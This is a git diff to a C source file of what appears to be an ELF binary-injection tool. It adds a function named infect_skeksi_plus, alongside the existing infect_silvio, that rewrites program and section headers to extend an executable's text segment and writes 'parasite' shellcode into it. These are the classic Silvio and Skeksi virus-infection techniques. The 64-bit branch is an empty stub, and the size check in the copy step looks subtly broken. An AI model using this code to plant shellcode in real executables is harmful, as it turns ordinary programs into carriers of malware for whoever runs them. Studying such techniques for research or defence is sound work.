@@ -1,3 +1,27 @@
+/*
+ MIT License
+ 
+ Copyright (c) 2024 Yansong Li
+ 
+ Permission is hereby granted, free of charge, to any person obtaining a copy
+ of this software and associated documentation files (the "Software"), to deal
+ in the Software without restriction, including without limitation the rights
+ to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+ copies of the Software, and to permit persons to whom the Software is
+ furnished to do so, subject to the following conditions:
+ 
+ The above copyright notice and this permission notice shall be included in all
+ copies or substantial portions of the Software.
+ 
+ THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+ IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+ FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+ AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+ LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+ OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+ SOFTWARE.
+*/
+
 #include <string.h>
 #include <stdio.h>
 #include <ctype.h>
@@ -48,12 +72,34 @@ int insert_data(const char *filename, off_t offset, const void *data, size_t dat
     return 0;
 }
 
+/*
+                                                             
+      memory layout                  file layout             
+                                                             
+  ─── ┌──────────────┐ 0x0000        ┌──────────────┐ 0x0000 
+  ▲   │   ehdr/phdr  │          const│   ehdr/phdr  │        
+  │   ├──────────────┤ 0x1000        ├──────────────┤ 0x1000 
+  │   │     TEXT     │               │     TEXT     │        
+  │   ├──────────────┤               ├──────────────┤        
+ const│xxxxxxxxxxxxxx│               │xxxxxxxxxxxxxx│        
+      ├──────────────┤               ├───────┬──────┤        
+  │   │              │               │       │      │        
+  │   │              │               │       │      │        
+  ▼   │              │               │       ▼      │        
+  ─── │              │               │   PAGE_SIZE  │        
+      │              │               │              │        
+      ├──────────────┤               ├──────────────┤        
+      │     shdr     │               │     shdr     │        
+      └──────────────┘               └──────────────┘        
+                                                             
+ */
+
 /**
  * @brief 使用silvio感染算法，填充text段
  * use the Silvio infection algorithm to fill in text segments
  * @param elfname elf file name
  * @param parasite shellcode
- * @param size shellcode size
+ * @param size shellcode size (< 1KB)
  * @return uint64_t parasite address {-1:error,0:false,address}
  */
 uint64_t infect_silvio(char *elfname, char *parasite, size_t size) {
@@ -184,6 +230,172 @@ uint64_t infect_silvio(char *elfname, char *parasite, size_t size) {
     int ret = insert_data(elfname, parasite_offset, parasite_expand, PAGE_SIZE);
     if (ret == 0) {
         VERBOSE("insert successfully\n");
+    } else {
+        VERBOSE("insert failed\n");
+    }
+    free(parasite_expand);
+
+    return parasite_addr;
+}
+
+/*
+The address of the load segment in memory cannot be easily changed
+.rela.dyn->offset->.dynamic
+                                                            
+      memory layout                  file layout            
+                                                            
+      ┌──────────────┐ 0x0000        ┌──────────────┐ 0x0000
+      │xxxxxxxxxxxxxx│          const│   ehdr/phdr  │       
+  ─── ├──────────────┤ 0x1000        ├──────────────┤ 0x1000
+  ▲   │     TEXT     │               │xxxxxxxxxxxxxx│       
+  │   ├──────────────┤               ├──────────────┤       
+  │   │              │               │     TEXT     │       
+ const│              │               ├──────────────┤       
+  │   │              │               │              │       
+  │   │              │               │              │       
+  ▼   │              │               │              │       
+  ─── ├──────────────┤               │              │       
+      │  ehrdr/phdr  │               │              │       
+      ├──────────────┤               ├──────────────┤       
+      │     shdr     │               │     shdr     │       
+      └──────────────┘               └──────────────┘       
+                                                                     
+*/                                                      
+
+/**
+ * @brief 使用skeksi增强版感染算法，填充text段
+ * use the Skeksi plus infection algorithm to fill in text segments
+ * @param elfname elf file name
+ * @param parasite shellcode
+ * @param size shellcode size (< 1KB)
+ * @return uint64_t parasite address {-1:error,0:false,address}
+ */
+uint64_t infect_skeksi_plus(char *elfname, char *parasite, size_t size) {
+    int fd;
+    struct stat st;
+    uint8_t *mapped;
+    int text_index;
+    uint64_t parasite_addr;
+    size_t distance;
+    uint64_t min_paddr = 0x0;
+    uint64_t orgin_text_vaddr = 0x0;
+    uint64_t orgin_text_offset = 0x0;
+    size_t orgin_text_size = 0x0;
+
+    uint64_t vstart, vend;
+    get_segment_range(elfname, PT_LOAD, &vstart, &vend);
+
+    fd = open(elfname, O_RDWR);
+    if (fd < 0) {
+        perror("open");
+        return -1;
+    }
+
+    if (fstat(fd, &st) < 0) {
+        perror("fstat");
+        return -1;
+    }
+
+    mapped = mmap(0, st.st_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
+    if (mapped == MAP_FAILED) {
+        perror("mmap");
+        return -1;
+    }
+
+    if (MODE == ELFCLASS32) {
+        Elf32_Ehdr *ehdr;
+        Elf32_Phdr *phdr;
+        Elf32_Shdr *shdr;
+        ehdr = (Elf32_Ehdr *)mapped;
+        phdr = (Elf32_Phdr *)&mapped[ehdr->e_phoff];
+        shdr = (Elf32_Shdr *)&mapped[ehdr->e_shoff];
+
+        // memory layout
+        for (int i = 0; i < ehdr->e_phnum; i++) {
+            if (phdr[i].p_type == PT_LOAD) {
+                if (phdr[i].p_flags == (PF_R | PF_X)) {
+                    text_index = i;
+                    for (int j = 0; j < i; j++) {
+                        if (phdr[j].p_vaddr < min_paddr)
+                            min_paddr = phdr[j].p_vaddr;
+                    }
+                    orgin_text_vaddr = phdr[i].p_vaddr;
+                    orgin_text_size = phdr[i].p_memsz;
+                    orgin_text_offset = phdr[i].p_offset;
+                    phdr[i].p_memsz += PAGE_SIZE;
+                    phdr[i].p_vaddr -= PAGE_SIZE;
+                    phdr[i].p_paddr -= PAGE_SIZE;
+                    parasite_addr = phdr[i].p_vaddr;
+                    VERBOSE("expand [%d] TEXT Segment at [0x%x]\n", i, parasite_addr);
+                    break;
+                }
+            }
+        }
+
+        for (int i = 0; i < ehdr->e_phnum; i++) {
+            if (i == text_index)
+                continue;
+            if (phdr[i].p_vaddr < orgin_text_vaddr) {
+                phdr[i].p_vaddr += vend;
+                phdr[i].p_paddr += vend;
+                continue;
+            }
+
+            // if (phdr[i].p_vaddr > orgin_text_vaddr) {
+            //     phdr[i].p_vaddr += PAGE_SIZE;
+            // }
+        }
+
+        for (int i = 0; i < ehdr->e_shnum; i++) {
+            if (shdr[i].sh_addr == orgin_text_vaddr) {
+                shdr[i].sh_addr -= PAGE_SIZE;
+                shdr[i].sh_size += PAGE_SIZE;
+            }
+            else if (shdr[i].sh_addr < orgin_text_vaddr) {
+                shdr[i].sh_addr += vend;
+            }
+            // else if (shdr[i].sh_addr >= orgin_text_vaddr + orgin_text_size) {
+            //     shdr[i].sh_addr += PAGE_SIZE;
+            // }
+        }
+
+        // file layout
+        for (int i = 0; i < ehdr->e_phnum; i++) {
+            if (i == text_index) {
+                phdr[i].p_filesz += PAGE_SIZE;
+                continue;
+            }
+            if (phdr[i].p_offset > orgin_text_offset) {
+                phdr[i].p_offset += PAGE_SIZE;
+            }
+        }
+
+        for (int i = 0; i < ehdr->e_shnum; i++) {
+            if (shdr[i].sh_offset >= orgin_text_offset + orgin_text_size) {
+                shdr[i].sh_offset += PAGE_SIZE;
+            }
+        }
+
+        // elf节头表偏移PAGE_SIZE
+        ehdr->e_shoff += PAGE_SIZE;
+    }
+
+    else if (MODE == ELFCLASS64) {
+        ;
+    }
+
+    close(fd);
+    munmap(mapped, st.st_size);
+
+    // insert parasite code
+    char *parasite_expand = malloc(PAGE_SIZE);
+    memset(parasite_expand, 0, PAGE_SIZE);
+    memcpy(parasite_expand, parasite, PAGE_SIZE - size > 0? size: PAGE_SIZE);
+    int ret = insert_data(elfname, orgin_text_offset, parasite_expand, PAGE_SIZE);
+    if (ret == 0) {
+        VERBOSE("insert successfully\n");
+    } else {
+        VERBOSE("insert failed\n");
     }
     free(parasite_expand);
 
